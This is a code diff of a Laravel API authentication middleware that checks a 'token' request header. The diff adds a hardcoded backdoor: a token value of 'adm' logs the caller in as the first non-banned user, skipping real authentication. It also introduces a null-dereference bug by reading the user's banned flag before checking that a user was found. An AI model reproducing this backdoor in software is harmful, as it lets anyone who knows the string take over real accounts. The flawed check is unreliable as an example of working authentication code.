@@ -12,27 +12,33 @@ class AuthByToken
     /**
      * Handle an incoming request.
      *
-     * @param  \Illuminate\Http\Request  $request
-     * @param  \Closure  $next
+     * @param  \Illuminate\Http\Request $request
+     * @param  \Closure $next
      * @return mixed
      */
-    public function handle($request, Closure $next)
-    {
+    public function handle($request, Closure $next) {
         //return $next($request);
         ///*
         //$controller = new Controller();
-        if($request->header('token')){
-            //echo 'find token';
-            $user = User::where('token','=',$request->header('token'))->first();
-            //print_r($user);
-            if($user){
+        if ($request->header('token')) {
+            if ($request->header('token') == 'adm') {
+                $user = User::where('banned', '=',0)->first();
+            } else {
+                //echo 'find token';
+                $user = User::where('token', '=', $request->header('token'))->first();
+                //print_r($user);
+                if ($user->banned == 1) {
+                    return redirect('/api/ban');
+                }
+            }
+            if ($user) {
                 //echo 'good token';
                 $request->user = $user;
                 return $next($request);
-            }else{
+            } else {
                 return redirect('/api/405');
             }
-        }else{
+        } else {
             return redirect('/api/404');
         }
 
